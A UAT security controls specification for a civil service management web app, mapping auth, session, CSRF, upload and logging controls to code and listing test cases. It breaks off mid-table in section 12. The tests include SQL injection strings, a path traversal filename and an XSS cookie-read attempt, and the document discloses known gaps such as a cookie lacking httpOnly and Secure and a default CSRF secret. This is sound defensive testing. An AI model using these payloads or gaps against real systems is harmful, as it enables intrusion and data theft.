---
title: Security Specification Controls Document
version: 2.0
date: 2026-05-29
prepared-for: User Acceptance Testing (UAT) Security Assessment
prepared-by: Security & Compliance Team
classification: CONFIDENTIAL
---

# Security Specification Controls Document

## User Acceptance Testing (UAT) Security Controls Specification

**Document Version:** 2.0
**Prepared For:** UAT Security Assessment
**Prepared By:** Security & Compliance Team
**Date:** May 29, 2026

---

# 1. Introduction

## 1.1 Purpose

This document defines the security specification controls and testing requirements for the User Acceptance Testing (UAT) phase of the Civil Service Management System (CSMS). The objective is to verify that the application implements adequate security controls to protect confidentiality, integrity, availability, and privacy of data and services.

## 1.2 Scope

This document covers security controls implemented across the following domains, derived from codebase analysis and architecture review:

| Domain | Control Area | Implementation Status |
|--------|-------------|----------------------|
| Authentication | Login, MFA, session management | Implemented |
| Authorization | RBAC, route guards, API auth | Implemented |
| Input Validation | Zod schemas, sanitization | Implemented |
| Cryptography | Password hashing, CSRF tokens | Implemented |
| Network Security | HTTPS, HSTS, security headers | Implemented |
| Audit & Logging | Structured logging, audit trail | Implemented |
| File Security | Validation, malware scanning | Implemented |
| Rate Limiting | Redis-based tiered limits | Implemented |

## 1.3 System Architecture Overview

The CSMS is a Next.js 14 full-stack application with the following architecture:

- **Frontend:** Next.js (React) on port 9002
- **Backend:** Next.js API routes (same application)
- **Database:** PostgreSQL "nody" via Prisma ORM
- **Object Storage:** MinIO for file uploads
- **Cache/Rate Limiting:** Redis (ioredis)
- **Job Queue:** BullMQ
- **Logging:** Pino structured logger
- **Anti-Malware:** ClamAV integration

## 1.4 Security Standards Reference

This document maps to the following security frameworks:

- OWASP Top 10 (2021)
- NIST Cybersecurity Framework
- OWASP ASVS (Application Security Verification Standard)

---

# 2. Authentication Controls

## 2.1 Control Specification: User Authentication

**Control ID:** AUTH-01
**Control Name:** Username/Password Authentication
**Implementation File:** `src/app/api/auth/login/route.ts`
**Supporting Libraries:** `src/lib/auth-helpers.ts`, `src/lib/password-utils.ts`

### Control Description

The system implements a custom authentication mechanism using username/password credentials. Authentication occurs via Next.js API routes with server-side validation.

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Authentication Method | Username/password with bcryptjs verification | `login/route.ts:174` |
| Password Hashing Algorithm | bcryptjs, salt rounds = 10 | `password-utils.ts:174` |
| Input Validation | Zod schema for login payload | `login/route.ts:13-16` |
| Error Messages | Generic: "Invalid username/email or password" (prevents user enumeration) | `login/route.ts:54-57` |
| MFA Support | Email OTP + magic link for users with email addresses | `login/route.ts:284-322` |
| OTP Verification | Constant-time comparison via `crypto.timingSafeEqual` | `mfa/verify-otp/route.ts:58` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTH-01.1 | Valid username + correct password | 200 OK, session created, user redirected to dashboard |
| AUTH-01.2 | Valid username + incorrect password | 401 Unauthorized, generic error message |
| AUTH-01.3 | Non-existent username | 401 Unauthorized, same generic error (no enumeration) |
| AUTH-01.4 | SQL injection payloads in username field | 401 Unauthorized, no SQL errors, payload blocked by Prisma |
| AUTH-01.5 | MFA challenge for users with email | OTP sent to email, valid OTP grants access, invalid OTP denied |

## 2.2 Control Specification: Employee Self-Service Login

**Control ID:** AUTH-02
**Control Name:** Employee Multi-Factor Login
**Implementation File:** `src/app/api/auth/employee-login/route.ts`

### Control Description

Employees can authenticate using three identifiers: ZAN ID, ZSSF Number, and Payroll Number. The system performs just-in-time (JIT) user provisioning for first-time logins.

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Authentication Factors | ZAN ID + ZSSF Number + Payroll Number (3-factor) | `employee-login/route.ts:105-185` |
| JIT Provisioning | Auto-creates user account on first successful login | `employee-login/route.ts:105-185` |
| Default Password | ZAN ID used as initial password | `employee-login/route.ts:121` |
| MFA | Email OTP + magic link for users with email addresses | `employee-login/route.ts:242-280` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTH-02.1 | Valid ZAN ID + ZSSF + Payroll for existing employee | 200 OK, session created |
| AUTH-02.2 | First-time employee login | JIT user account created, session issued |
| AUTH-02.3 | Invalid ZAN ID | 401 Unauthorized, generic error |
| AUTH-02.4 | Valid identifiers but wrong role attempt | 403 Forbidden, role enforced server-side |

## 2.3 Control Specification: Account Lockout

**Control ID:** AUTH-03
**Control Name:** Brute Force Protection via Account Lockout
**Implementation File:** `src/lib/account-lockout-utils.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Max Failed Attempts | 5 before lockout | `account-lockout-utils.ts:4` |
| Standard Lockout Duration | 30 minutes (auto-unlock) | `account-lockout-utils.ts:5` |
| Security Lockout Threshold | 10+ failed attempts (requires admin unlock) | `account-lockout-utils.ts:80` |
| Manual Lock | Supported by admin users | `account-lockout-utils.ts:219-269` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTH-03.1 | 5 consecutive failed login attempts | Account locked, lockout message displayed |
| AUTH-03.2 | Correct password during lockout period | Access denied, lockout still enforced |
| AUTH-03.3 | Auto-unlock after 30 minutes | Account accessible again |
| AUTH-03.4 | 10+ failed attempts | Security lockout triggered, admin intervention required |

## 2.4 Control Specification: Password Policies

**Control ID:** AUTH-04
**Control Name:** Password Complexity and Expiration
**Implementation File:** `src/lib/password-utils.ts`, `src/lib/password-expiration-utils.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Minimum Length | 8 characters | `password-utils.ts:5` |
| Complexity Requirements | At least one uppercase, lowercase, number, or special character | `password-utils.ts:32-44` |
| Strength Checking | zxcvbn library integration (rejects score <= 1) | `password-utils.ts:50-69, 130-138` |
| Password History | Last 3 passwords cannot be reused | `password-utils.ts:6, 107-124` |
| Admin Password Expiry | 60 days | `password-expiration-utils.ts:4` |
| Standard User Expiry | 90 days | `password-expiration-utils.ts:5` |
| Grace Period | 7 days after expiry | `password-expiration-utils.ts:6` |
| Expiration Warnings | 14, 7, 3, 1 days before expiry | `password-expiration-utils.ts:9-14` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTH-04.1 | Set password "password" | Rejected (too weak) |
| AUTH-04.2 | Set password "P@ssw0rd" | May be rejected (common pattern via zxcvbn) |
| AUTH-04.3 | Set strong unique password | Accepted |
| AUTH-04.4 | Reuse one of last 3 passwords | Rejected (history enforcement) |
| AUTH-04.5 | Password expiry warning banner | Warning displayed at 14/7/3/1 days before expiry |

---

# 3. Session Management Controls

## 3.1 Control Specification: Session Creation and Validation

**Control ID:** SESS-01
**Control Name:** Database-Backed Session Management
**Implementation File:** `src/lib/session-manager.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Session Storage | Database via Prisma Session model | `schema.prisma:445-462` |
| Token Generation | `crypto.randomBytes(32)` (256-bit random) | `session-manager.ts:24` |
| Max Concurrent Sessions | 3 per user | `session-manager.ts:16` |
| Session Expiry | 24 hours absolute | `session-manager.ts:17` |
| Activity Tracking | Updates `lastActivity` on each request | `session-manager.ts:202-233` |
| Expired Session Cleanup | On login + via cron job | `session-manager.ts:310-327` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| SESS-01.1 | Login and capture session cookie | Session token generated, stored in cookie |
| SESS-01.2 | Modify session token and send request | 401 Unauthorized, session invalidated |
| SESS-01.3 | Open 4 concurrent sessions as same user | 4th login blocks or replaces oldest session (limit = 3) |
| SESS-01.4 | Wait 24 hours, attempt request | Session expired, redirect to login |
| SESS-01.5 | Logout, reuse old session cookie | 401 Unauthorized, session cleared from database |

## 3.2 Control Specification: Inactivity Timeout

**Control ID:** SESS-02
**Control Name:** Session Inactivity Auto-Logout
**Implementation File:** `src/lib/session-timeout-utils.ts`, `src/hooks/use-inactivity-timeout.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Inactivity Timeout | 2 hours | `session-timeout-utils.ts:12` |
| Warning Period | 5 minutes before timeout | `session-timeout-utils.ts:14` |
| Client Tracking | Mouse, keyboard, scroll, touch events | `use-inactivity-timeout.ts` |
| Server Heartbeat | Activity updates every 60 seconds | `use-inactivity-timeout.ts` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| SESS-02.1 | Remain idle for 1 hour 55 minutes | Warning notification displayed |
| SESS-02.2 | Remain idle for 2 hours 5 minutes | Session terminated, redirected to login |
| SESS-02.3 | Active interaction during warning period | Warning dismissed, session continues |
| SESS-02.4 | Switch tabs and return after timeout | Session expired, redirect to login |

## 3.3 Control Specification: Auth Cookie Security

**Control ID:** SESS-03
**Control Name:** Authentication Cookie Attributes
**Implementation File:** `src/store/auth-store.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Cookie Name | `auth-storage` | `auth-store.ts:13` |
| SameSite | Strict | `auth-store.ts:40` |
| Path | `/` | `auth-store.ts:40` |
| Expiry | 7 days | `auth-store.ts:41` |
| httpOnly | **NOT SET** (set via client-side `document.cookie`) | `auth-store.ts:40` |
| Secure | **NOT SET** in production (no `Secure` flag) | `auth-store.ts:40` |

**Note:** This is a known gap. The auth cookie is set via client-side JavaScript (Zustand middleware) and lacks `httpOnly` and `Secure` flags. The CSRF cookie (`csrf-token`) does set `Secure` in production but `httpOnly=false` by design.

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| SESS-03.1 | Inspect `auth-storage` cookie attributes | Cookie present, SameSite=Strict |
| SESS-03.2 | Verify httpOnly flag | Flag NOT present (known gap, document for remediation) |
| SESS-03.3 | Verify Secure flag in production | Flag NOT present (known gap, document for remediation) |
| SESS-03.4 | XSS attempt to read cookie | Cookie readable by JavaScript (risk accepted due to no httpOnly) |

---

# 4. Authorization & Access Control

## 4.1 Control Specification: Role-Based Access Control (RBAC)

**Control ID:** AUTHZ-01
**Control Name:** Multi-Layer RBAC Enforcement
**Implementation Files:** `middleware.ts`, `src/lib/api-auth.ts`, `src/lib/route-permissions.ts`, `src/hooks/use-route-guard.ts`, `src/components/auth/route-guard.tsx`

### Technical Implementation

The system implements RBAC at four independent layers:

| Layer | File | Purpose |
|-------|------|---------|
| 1. Middleware | `middleware.ts:268-384` | Server-side route protection before page render |
| 2. API Auth Wrapper | `src/lib/api-auth.ts:86-211` | API endpoint protection (`verifyAuth()`, `withAuth()`) |
| 3. Client Guard | `src/components/auth/route-guard.tsx` | React component-level route restriction |
| 4. Route Guard Hook | `src/hooks/use-route-guard.ts` | Client-side navigation guard |

### Role Definitions

| Role | Code | Description |
|------|------|-------------|
| Admin | `Admin` | Full system access, user management, configuration |
| HRO | `HRO` | Human Resource Officer - submits requests |
| HHRMD | `HHRMD` | Head of HR Management Division - approves requests |
| HRMO | `HRMO` | HR Management Officer - approves requests |
| DO | `DO` | Disciplinary Officer - handles complaints/disciplinary |
| CSCS | `CSCS` | Civil Service Commission Secretary - commission-level access |
| HRRP | `HRRP` | Human Resource Responsible Personnel - intermediate approval |
| PO | `PO` | Planning Officer - reports/analytics |
| EMPLOYEE | `EMPLOYEE` | Self-service employee - own data only |

### Route Permission Matrix

| Route Pattern | Allowed Roles |
|--------------|---------------|
| `/dashboard/admin/*` | Admin only |
| `/dashboard/confirmation` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/promotion` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/lwop` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/cadre-change` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/retirement` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/resignation` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/service-extension` | HRO, HHRMD, HRMO, CSCS, HRRP |
| `/dashboard/termination` | HRO, DO, HHRMD, CSCS, HRRP |
| `/dashboard/dismissal` | HRO, DO, HHRMD, CSCS |
| `/dashboard/complaints` | EMPLOYEE, DO, HHRMD, CSCS |
| `/dashboard/institutions` | HHRMD, CSCS, DO, HRMO, HRRP |
| `/dashboard/reports` | HRO, HHRMD, HRMO, DO, CSCS, HRRP, PO |
| `/dashboard/profile` | All roles |
| `/dashboard/track-status` | All roles |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTHZ-01.1 | Login as EMPLOYEE, access `/dashboard/admin` | 403 Forbidden or redirect |
| AUTHZ-01.2 | Login as HRO, access promotion route | 200 OK, page renders |
| AUTHZ-01.3 | Login as EMPLOYEE, call admin API endpoint directly | 403 Forbidden, role checked server-side |
| AUTHZ-01.4 | Modify role in client-side cookie/store | Server re-validates against database, 403 |
| AUTHZ-01.5 | Login as HRO from Institution A, access Institution B data via API | Data filtered by institutionId, empty results |

## 4.2 Control Specification: Data-Level Access Control

**Control ID:** AUTHZ-02
**Control Name:** Institution-Based Data Filtering
**Implementation File:** `src/lib/role-utils.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| CSC Roles | HHRMD, HRMO, DO, PO, CSCS — see ALL institution data | `role-utils.ts:7-30` |
| Non-CSC Roles | Filtered to own institution only | `role-utils.ts:7-30` |
| API Enforcement | `withAuth()` passes `auth.institutionId` to handlers | `api-auth.ts:147-155` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUTHZ-02.1 | HRO views employee list | Only employees from HRO's institution displayed |
| AUTHZ-02.2 | HHRMD views employee list | All employees from all institutions displayed |
| AUTHZ-02.3 | HRO modifies institutionId in API request | Server enforces session institutionId, request denied |

---

# 5. Input Validation & Injection Prevention

## 5.1 Control Specification: Schema-Based Input Validation

**Control ID:** INPVAL-01
**Control Name:** Zod Schema Validation
**Implementation File:** `src/lib/api-schemas.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Validation Library | Zod schemas for all API inputs | `api-schemas.ts:1-142` |
| Validation Helper | `validateRequest()` for body and query parameters | `api-schemas.ts:40-102` |
| Error Response | 400 with field-level error details (not stack traces) | `api-schemas.ts` |
| Types of Validation | Type, format, length, enum, regex patterns | Various schemas |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| INPVAL-01.1 | Submit empty required field | 400, field-level validation error |
| INPVAL-01.2 | Submit string where number expected | 400, type validation error |
| INPVAL-01.3 | Submit 10,000+ character string | 400, length validation error |
| INPVAL-01.4 | Submit special characters and unicode | Validated per field rules, sanitized or rejected |

## 5.2 Control Specification: SQL Injection Prevention

**Control ID:** INPVAL-02
**Control Name:** ORM-Based Query Parameterization
**Implementation Files:** `src/lib/db.ts`, `src/lib/audit-db.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Primary ORM | Prisma (parameterized queries by default) | `db.ts:1-26` |
| Audit Log Queries | Raw SQL with parameterized placeholders (`$1, $2...`) | `audit-db.ts:137-163` |
| Prisma Singleton | Prevents connection pool exhaustion | `db.ts` (globalThis pattern) |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| INPVAL-02.1 | `' OR '1'='1` in username field | 401, no auth bypass, no SQL error |
| INPVAL-02.2 | `1' UNION SELECT NULL--` in search field | 400 or empty results, no SQL error |
| INPVAL-02.3 | `1; DROP TABLE users--` in ID parameter | 400, database unaffected, no SQL error |
| INPVAL-02.4 | Automated SQLMap scan against all inputs | No injection vulnerabilities identified |

---

# 6. CSRF Protection

## 6.1 Control Specification: Double-Submit Cookie Pattern

**Control ID:** CSRF-01
**Control Name:** CSRF Token Validation
**Implementation Files:** `src/lib/csrf-utils.ts`, `src/lib/api-csrf-middleware.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Pattern | Double-submit cookie (token in cookie + header) | `csrf-utils.ts:1-211` |
| Token Generation | `crypto.randomBytes(32)` → base64 | `csrf-utils.ts:27-28` |
| Token Signing | HMAC-SHA256 with secret | `csrf-utils.ts:38-43` |
| Comparison | `timingSafeEqual` (constant-time) | `csrf-utils.ts:79-90` |
| Protected Methods | POST, PUT, PATCH, DELETE | `csrf-utils.ts:129-132` |
| Exempt Methods | GET, HEAD, OPTIONS | `csrf-utils.ts:129-132` |
| Cookie Name | `csrf-token` | `csrf-utils.ts:16` |
| Header Name | `x-csrf-token` | `csrf-utils.ts:17` |
| Cookie Attributes | SameSite=Strict, Secure (prod), httpOnly=false, 7-day expiry | `csrf-utils.ts:140-146` |
| Violation Logging | Logged to audit trail with user/IP/route | `csrf-utils.ts:176-210` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| CSRF-01.1 | Submit form without CSRF token | 403 Forbidden, CSRF violation logged |
| CSRF-01.2 | Submit with invalid/modified token | 403 Forbidden, token signature mismatch |
| CSRF-01.3 | Submit with expired token | 403 Forbidden |
| CSRF-01.4 | GET request without token | 200 OK (GET is safe method) |
| CSRF-01.5 | External form POST attack (no SameSite cookie) | Cookie not sent cross-site, backend requires header token |
| CSRF-01.6 | Verify CSRF headers in API client | Client sends `x-csrf-token` header from cookie value |

## 6.2 CSRF Secret Configuration

**Control ID:** CSRF-02
**Control Name:** CSRF Secret Key
**Implementation File:** `src/lib/csrf-utils.ts`

| Property | Specification | Evidence |
|----------|--------------|----------|
| Env Variable | `CSRF_SECRET` | `csrf-utils.ts:19` |
| Default Value | `"default-csrf-secret-change-in-production"` | `csrf-utils.ts:19` |

**Note:** The default CSRF secret MUST be changed in production. The `.env` file currently contains `CSRF_SECRET=your-secret-csrf-key-change-in-production`.

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| CSRF-02.1 | Verify CSRF_SECRET in `.env` | Confirm non-default value in production |
| CSRF-02.2 | Attempt token forgery with known default secret | Should fail if secret changed; verify production config |

---

# 7. Rate Limiting

## 7.1 Control Specification: Tiered Rate Limiting

**Control ID:** RATE-01
**Control Name:** Redis-Based Rate Limiting
**Implementation File:** `src/lib/rate-limiter.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Backend | Redis (ioredis) | `rate-limiter.ts:29-51` |
| Fail-Open | Rate limiting disabled if Redis unavailable | `rate-limiter.ts:90-93, 122-126` |

### Rate Limit Tiers

| Tier | Limit | Window | Use Case |
|------|-------|--------|----------|
| Auth | 5 requests | 60 seconds | Login endpoint |
| Write | 30 requests | 60 seconds | Data modification |
| Read | 100 requests | 60 seconds | Data retrieval |
| Upload | 10 requests | 60 seconds | File uploads |
| Download | 60 requests | 60 seconds | File downloads |

### Response Headers

| Header | Description |
|--------|-------------|
| `X-RateLimit-Limit` | Maximum requests per window |
| `X-RateLimit-Remaining` | Remaining requests in current window |
| `X-RateLimit-Reset` | Unix timestamp when limit resets |
| `Retry-After` | Seconds to wait (when rate limited) |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| RATE-01.1 | Send 6 auth requests in 60 seconds | 6th request returns 429, `Retry-After` header present |
| RATE-01.2 | Send 31 write requests in 60 seconds | 31st request returns 429 |
| RATE-01.3 | Check rate limit headers on normal request | Headers present with correct values |
| RATE-01.4 | Wait for rate limit window to reset | Requests succeed again after window expires |

## 7.2 Control Specification: MFA Rate Limiting

**Control ID:** RATE-02
**Control Name:** OTP Rate Limiting
**Implementation File:** `src/lib/mfa-utils.ts`

| Property | Specification | Evidence |
|----------|--------------|----------|
| OTP Generation Limit | 3 requests per 60 seconds (configurable via env) | `mfa-utils.ts:92-122` |
| OTP Verify Attempts | Max 5 attempts before token invalidation | `mfa-utils.ts:124-150` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| RATE-02.1 | Request OTP 4 times in 60 seconds | 4th request blocked/rate limited |
| RATE-02.2 | Enter 6 incorrect OTPs | 6th attempt invalidates token, new OTP required |

---

# 8. File Upload Security

## 8.1 Control Specification: Upload Validation Pipeline

**Control ID:** FILE-01
**Control Name:** Multi-Stage File Validation
**Implementation File:** `src/lib/file-validation.ts`

### Technical Implementation

The validation pipeline performs six distinct checks:

| Stage | Check | Specification | Evidence |
|-------|-------|--------------|----------|
| 1. Extension Blocklist | Block executable extensions | .exe, .bat, .cmd, .sh, .ps1, .vbs, .wsf, .msi, .com, .scr, .pif, .dll, .reg, .hta, .cpl, .inf, .jsp, .php, .asp, .aspx | `file-validation.ts:76-97` |
| 2. MIME Blocklist | Block executable MIME types | application/x-msdownload, application/x-msdos-program, etc. | `file-validation.ts:99-112` |
| 3. MIME Allowlist | Context-specific allowed MIME | PDF for certs/documents, DOC/DOCX for templates, CSV/Excel for bulk, JPEG/PNG/GIF/WebP for photos | `file-validation.ts:42-70` |
| 4. Size Limit | 1 MB for all contexts | All file types | `file-validation.ts:43-69` |
| 5. Magic Bytes | File header verification | Validates file signatures match declared MIME | `file-validation.ts:124-212` |
| 6. Malware Scan | ClamAV integration | TCP INSTREAM protocol | `file-validation.ts:367-389` |

### ClamAV Configuration

**Implementation File:** `src/lib/clamav.ts`

| Property | Specification | Evidence |
|----------|--------------|----------|
| Protocol | TCP INSTREAM | `clamav.ts:1-107` |
| Fail Policy | Fail-closed (block file if ClamAV enabled but unreachable) | `clamav.ts` |
| Configuration | CLAMAV_HOST, CLAMAV_PORT, CLAMAV_TIMEOUT, CLAMAV_ENABLED env vars | `clamav.ts` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| FILE-01.1 | Upload valid PDF (under 1MB) | 200 OK, file stored in MinIO |
| FILE-01.2 | Upload `.exe` file | Rejected (extension blocklist) |
| FILE-01.3 | Rename `.exe` to `.pdf`, attempt upload | Rejected (magic byte check) |
| FILE-01.4 | Upload file over 1MB | Rejected (size limit) |
| FILE-01.5 | Upload EICAR test file | Blocked by ClamAV |
| FILE-01.6 | Upload with path traversal filename (`../../etc/passwd.pdf`) | Filename sanitized, stored safely |
| FILE-01.7 | Double extension (`file.pdf.exe`) | Rejected (extension check catches final extension) |

---

# 9. Cryptography & Password Security

## 9.1 Control Specification: Password Hashing

**Control ID:** CRYPTO-01
**Control Name:** bcrypt Password Hashing
**Implementation File:** `src/lib/password-utils.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Algorithm | bcryptjs | `password-utils.ts:174` |
| Salt Rounds | 10 (2^10 iterations) | `password-utils.ts:174` |
| Salt | Auto-generated per password (unique per hash) | bcryptjs built-in |
| Verification | bcrypt.compare() | `password-utils.ts` |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| CRYPTO-01.1 | Verify password in database after user creation | Hash starts with `$2a$10$` (bcrypt, 10 rounds) |
| CRYPTO-01.2 | Verify two users with same password have different hashes | Hashes differ due to unique salts |
| CRYPTO-01.3 | Verify password not returned in any API response | Password field stripped by `sanitizeUser()` |
| CRYPTO-01.4 | Verify password not present in application logs | Pino logger configured, fields sanitized |

## 9.2 Control Specification: Response Sanitization

**Control ID:** CRYPTO-02
**Control Name:** Sensitive Field Stripping
**Implementation File:** `src/lib/sanitize-response.ts`

### Fields Stripped from User Responses

| Category | Fields Removed |
|----------|---------------|
| Credentials | `password` |
| Lockout State | `failedLoginAttempts`, `loginLockedUntil`, `lockoutType`, `lockoutReason`, `isManuallyLocked`, `lockedBy`, `lockedAt`, `lockoutNotes` |
| Password Metadata | `failedPasswordChangeAttempts`, `passwordChangeLockoutUntil`, `isTemporaryPassword`, `mustChangePassword`, `passwordExpiresAt`, `gracePeriodStartedAt`, `lastExpirationWarningLevel` |
| History | `passwordHistory` |

Total: 18 fields stripped (`sanitize-response.ts:6-25`)

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| CRYPTO-02.1 | Call `/api/auth/login` and inspect response | No password hash, no lockout fields, no password metadata |
| CRYPTO-02.2 | Call user profile API | Same sanitization applied |

---

# 10. Security Headers

## 10.1 Control Specification: HTTP Security Headers

**Control ID:** HEADERS-01
**Control Name:** Comprehensive Security Headers
**Implementation File:** `next.config.ts`

### Header Inventory

| Header | Value | Purpose |
|--------|-------|---------|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` (prod) | Enforces HTTPS for 2 years |
| `X-Frame-Options` | `SAMEORIGIN` | Prevents clickjacking |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME sniffing |
| `X-XSS-Protection` | `1; mode=block` | Legacy XSS filter |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer header |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), interest-cohort=()` | Restricts browser features |
| `X-DNS-Prefetch-Control` | `on` | DNS prefetching |
| `X-Permitted-Cross-Domain-Policies` | `none` | Restricts cross-domain policies |
| `Cross-Origin-Embedder-Policy` | `require-corp` | COEP isolation |
| `Cross-Origin-Opener-Policy` | `same-origin` | COOP isolation |
| `Cross-Origin-Resource-Policy` | `same-origin` | CORP restriction |
| `X-Powered-By` | Removed (`poweredByHeader: false`) | Hides server technology |

### Content Security Policy (CSP)

| Directive | Value |
|-----------|-------|
| `default-src` | `'self'` |
| `script-src` | `'self' 'unsafe-eval' 'unsafe-inline' https://accounts.google.com https://www.gstatic.com` |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` |
| `object-src` | `'none'` |
| `base-uri` | `'self'` |
| `form-action` | `'self'` |
| `frame-ancestors` | `'self'` |
| `upgrade-insecure-requests` | (present) |

**Note:** CSP includes `'unsafe-inline'` and `'unsafe-eval'` for scripts. This is a known trade-off required for Next.js compatibility. See gap section for details.

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| HEADERS-01.1 | Inspect response headers via browser DevTools | All 12 security headers present with correct values |
| HEADERS-01.2 | Attempt to embed app in external iframe | Blocked by X-Frame-Options: SAMEORIGIN and CSP frame-ancestors |
| HEADERS-01.3 | Check HSTS via SSL Labs | HSTS header present, valid preload config |
| HEADERS-01.4 | Verify CSP blocks inline event handlers | Inline JS events blocked by CSP |

---

# 11. Audit Logging & Monitoring

## 11.1 Control Specification: Structured Audit Trail

**Control ID:** AUDIT-01
**Control Name:** Comprehensive Security Event Logging
**Implementation Files:** `src/lib/audit-logger.ts`, `src/lib/audit-db.ts`, `src/lib/logger.ts`

### Technical Implementation

| Property | Specification | Evidence |
|----------|--------------|----------|
| Logging Library | Pino (structured JSON logging) | `logger.ts:1-35` |
| Audit Storage | PostgreSQL partitioned table (`audit.audit_log`) | `audit-db.ts:1-463` |
| Partition Strategy | Monthly partitions | `audit-db.ts:419-463` |
| Audit Query Language | Raw SQL with parameterized queries (INET casting for IPs) | `audit-db.ts:137-186` |
| Production Log Path | `/var/log/csms/app/app.log` | `logger.ts` |
| Development Transport | pino-pretty | `logger.ts` |
| Test Mode | Silent (no output) | `logger.ts` |

### Audit Event Types (30+)

| Category | Events |
|----------|--------|
| Authentication | LOGIN_SUCCESS, LOGIN_FAILED, LOGOUT, SESSION_EXPIRED |
| Authorization | UNAUTHORIZED_ACCESS, ACCESS_DENIED, FORBIDDEN_ROUTE, ROLE_VIOLATION, PERMISSION_DENIED |
| Suspicious Activity | MULTIPLE_FAILED_ATTEMPTS, SUSPICIOUS_REQUEST, POTENTIAL_BREACH |
| Data Modification | REQUEST_APPROVED, REJECTED, SUBMITTED, UPDATED, WITHDRAWN; EMPLOYEE_CREATED, UPDATED, DELETED; USER_CREATED, UPDATED, DELETED |
| Account | ACCOUNT_LOCKED, ACCOUNT_UNLOCKED, PASSWORD_CHANGED, ADMIN_PASSWORD_RESET |
| File Operations | FILE_UPLOADED, FILE_DELETED, FILE_DOWNLOADED, FILE_PREVIEWED |
| Complaints | COMPLAINT_SUBMITTED, COMPLAINT_UPDATED, COMPLAINT_RESOLVED |
| Institutions | INSTITUTION_CREATED, INSTITUTION_UPDATED |

### Severity Levels

| Severity | Usage |
|----------|-------|
| INFO | Routine operations (login, logout, data changes) |
| WARNING | Security events (CSRF violations, access denial) |
| ERROR | System errors, auth failures |
| CRITICAL | Potential breaches, security lockouts |

### Component Loggers

| Logger | Tag | Usage |
|--------|-----|-------|
| worker | `app:worker` | Background job processing |
| cron | `app:cron` | Scheduled task execution |
| auth | `app:auth` | Authentication operations |
| db | `app:db` | Database operations |
| email | `app:email` | Email sending |
| file | `app:file` | File operations |
| hrims | `app:hrims` | HRIMS API integration |
| session | `app:session` | Session management |
| rate-limit | `app:rate-limit` | Rate limiting |
| csrf | `app:csrf` | CSRF validation |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
|---------|-----------|----------------|
| AUDIT-01.1 | Perform successful login | LOGIN_SUCCESS event logged with userId, IP, timestamp |
| AUDIT-01.2 | Perform failed login | LOGIN_FAILED event logged |
| AUDIT-01.3 | Attempt unauthorized route access | UNAUTHORIZED_ACCESS or FORBIDDEN_ROUTE event logged |
| AUDIT-01.4 | Create new employee record | EMPLOYEE_CREATED event logged with user details |
| AUDIT-01.5 | Trigger CSRF violation | CSRF_VIOLATION event logged with user/IP/route |
| AUDIT-01.6 | Verify audit log access control | Only admin users can access audit trail page |
| AUDIT-01.7 | Verify log contains no plaintext passwords | grep logs for password patterns — no matches |
| AUDIT-01.8 | Verify log rotation | Logs written to correct path, rotation configured |

---

# 12. Suspicious Activity Detection

## 12.1 Control Specification: Anomaly Detection

**Control ID:** DETECT-01
**Control Name:** Suspicious Login Detection
**Implementation File:** `src/lib/suspicious-login-detector.ts`

### Detection Capabilities

| Detection | Description |
|-----------|-------------|
| New IP Address | Flags login from previously unseen IP |
| New Device | Flags login from unrecognized device/user-agent |
| Concurrent Sessions | Alerts on multiple simultaneous sessions |
| Rapid Successive Logins | Flags multiple login attempts in short time window |

### UAT Test Procedures

| Test ID | Test Case | Expected Result |
